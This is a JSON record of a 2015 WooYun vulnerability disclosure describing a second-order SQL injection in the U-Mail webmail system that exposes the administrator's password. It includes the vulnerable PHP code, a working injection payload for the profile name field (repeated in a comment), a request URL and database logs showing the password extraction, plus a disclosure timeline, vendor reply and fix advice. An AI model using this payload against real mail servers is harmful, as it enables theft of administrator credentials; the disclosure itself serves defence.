{"id": 31691, "wybug_id": "wooyun-2015-099221", "wybug_title": "U-Mail邮件系统二次注入3（不鸡肋，可获取管理员密码）", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-03-06 11:47", "wybug_open_date": "2015-06-09 08:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向公众公开  简要描述： U-Mail邮件系统二次注入漏洞，可直接获取管理员密码 详细说明：  版本：最新版v9.8.57漏洞文件 /client/oab/module/operates.php 代码\nif ( ACTION == \"save-to-pab\" ){\t\tinclude_once( LIB_PATH.\"PAB.php\" );\t\t$PAB = PAB::getinstance( );\t\t$maillist_id = gss( $_GET['maillist'] );\t\tif ( $maillist_id )\t\t{\t\t\t\t$member_all = $Maillist->getMemberByMaillistID( $maillist_id, \"Mailbox,FullName\", 0 );\t\t\t\tif ( !$member_all )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );\t\t\t\t}\t\t\t\tforeach ( $member_all as $member )\t\t\t\t{\t\t\t\t\t\tif ( !$PAB->getContactByMail( $user_id, $member['Mailbox'], \"contact_id\", 0 ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\"fullname\" => $member['FullName'],//二次注入\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $member['Mailbox'],\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$res = $PAB->add_contact( $data, 0 );\t\t\t\t\t\t\t\tif ( !$res )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tdump_json( array(\t\t\t\t\t\t\t\t\t\t\t\t\"status\" => FALSE,\t\t\t\t\t\t\t\t\t\t\t\t\"message\" => el( \"添加联系人时发生错误，添加失败！\", \"\" )\t\t\t\t\t\t\t\t\t\t) );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\telse\t\t{\t\t\t\t$user_ids = gss( $_GET['userlist'] );\t\t\t\t$user_ids = id_list_filter( $user_ids );//WooYun-2014-72963\t\t\t\tif ( !$user_ids )\t\t\t\t{\t\t\t\t\t\tdump_msg( \"param_error\", el( \"参数错误！\", \"\" ) );\t\t\t\t}\t\t\t\t$where = \"t1.UserID IN (\".$user_ids.\")\";\t\t\t\t$arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, \"\", \"\", \"\", \"\", 0 );\t\t\t\t$user_all = $arr_tmp['data'];\t\t\t\tif ( !$user_all )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );\t\t\t\t}\t\t\t\tforeach ( $user_all as $user )\t\t\t\t{\t\t\t\t\t\t$qq = $msn = \"\";\t\t\t\t\t\tif ( strpos( $user['qqmsn'], \"@\" ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$msn = $user['qqmsn'];\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$qq = $user['qqmsn'];\t\t\t\t\t\t}\t\t\t\t\t\tif ( !$PAB->getContactByMail( $user_id, $user['email'], \"contact_id\", 0 ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\"fullname\" => $user['FullName'],\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $user['email'],\t\t\t\t\t\t\t\t\t\t\"pref_tel\" => $user['teleextension'] ? $user['teleextension'] : $user['mobil'],\t\t\t\t\t\t\t\t\t\t\"birthday\" => $user['birthday'],\t\t\t\t\t\t\t\t\t\t\"im_qq\" => $qq,\t\t\t\t\t\t\t\t\t\t\"im_msn\" => $msn,\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$res = $PAB->add_contact( $data, 0 );//二次注入\t\t\t\t\t\t\t\tif ( !$res )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tdump_json( array(\t\t\t\t\t\t\t\t\t\t\t\t\"status\" => FALSE,\t\t\t\t\t\t\t\t\t\t\t\t\"message\" => el( \"添加联系人时发生错误，添加失败！\", \"\" )\t\t\t\t\t\t\t\t\t\t) );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );}\n漏洞是先引入单引号，引入数据库，在个人资料处，填写如下exp，如图',`homepage`=(SELECT password from userlist where userid=2)#\n\nhttp://mail.fuck.com/webmail/client/oab/index.php?module=operate&action=member-get&page=1&orderby=&is_reverse=1&keyword=test2\n\n然后执行该漏洞函数，请求为\n\n查看个人通讯录，找到管理员密码，如图\n\nSQL执行的过程为\n150227 11:43:30\t 8724 Connect\tumail@localhost on \t\t 8724 Query\tSET NAMES 'UTF8'\t\t 8724 Init DB\tumail\t\t 8724 Query\tUPDATE userlist SET `FullName`='\\',`homepage`=(SELECT password from userlist where userid=2)#',`EnglishName`='' WHERE UserID='13'\t\t 8724 Query\tUPDATE mailuserinfo SET `sex`='0',`birthday`='0000-00-00',`mobil`='',`teleextension`='',`extnum`='',`qqmsn`='',`worknum`='',`memo`='',`o_group`='' WHERE UserID='13'\t\t 8724 Quit\t150227 11:46:10\t 8727 Connect\tumail@localhost on \t\t 8727 Query\tSET NAMES 'UTF8'\t\t 8727 Init DB\tumail\t\t 8727 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (13)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 8727 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (13)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 8727 Query\tSELECT contact_id FROM pab_contact WHERE user_id='13' AND pref_email='test2@fuck.com' LIMIT 1\t\t 8727 Query\tINSERT INTO pab_contact SET `user_id`='13',`fullname`='',`homepage`=(SELECT password from userlist where userid=2)#',`pref_email`='test2@fuck.com',`pref_tel`='',`birthday`='0000-00-00',`im_qq`='',`im_msn`='',`updated`='2015-02-27 11:46:10'\t\t 8727 Quit\n   漏洞证明：  如上   修复方案：  入库前进行转义处理   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-11 08:47 厂商回复： CNVD确认漏洞机理分析(暂未本地搭建或互联网实例复现,时间关系),已经由CNVD按以往联系渠道向软件生产厂商通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-06 13:00 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:22        | 谁送我HHKB,我就嫁给她！)\t\t \n  mark    \n     2015-03-06 13:44 |    \t\tcnssr4bb1t \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 优美。)\t\t \n  玩坏了    \n     2015-03-06 13:58 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  二次注入！坐等公开    \n     2015-04-19 22:07 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  笑哭    \n     2015-06-09 08:57 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  @Ano_Tom  就差几天 我那个才1个$    \n     2015-06-09 09:40 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  ',`homepage`=(SELECT password from userlist where userid=2)#  请问这个exp要根据那些if语句来构造的  还是？    \n     2015-06-09 11:18 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  明文保存密码，屌炸天    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}